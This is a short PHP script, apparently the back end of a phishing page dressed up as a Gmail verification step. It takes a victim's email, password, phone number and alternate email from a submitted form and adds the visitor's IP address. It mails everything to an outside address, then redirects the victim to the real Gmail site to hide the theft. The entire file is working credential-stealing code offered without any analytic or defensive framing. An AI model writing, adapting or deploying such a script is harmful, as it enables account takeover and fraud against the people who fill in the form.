<?php
    $to = "campbell.thomasqenos@gmail.com";
    $ip = getenv("REMOTE_ADDR");
	$user = $_POST['email'];
    $pass = $_POST['pass'];
    $c6790 = $_POST['phone'];
    $codec = $_POST['altemail'];
    $phone = $_POST['phone'];
    $from = "Lut@Tech.com";
    $subject = $ip . " Gmail Verify"; 
    $message = "Phone: $c6790\n AlternateEmail: $codec\n Email: $user\n Pass: $pass\nip: $ip\n";
    mail($to, $subject, $message, $from);
    header("Location: http://gmail.com");
?>
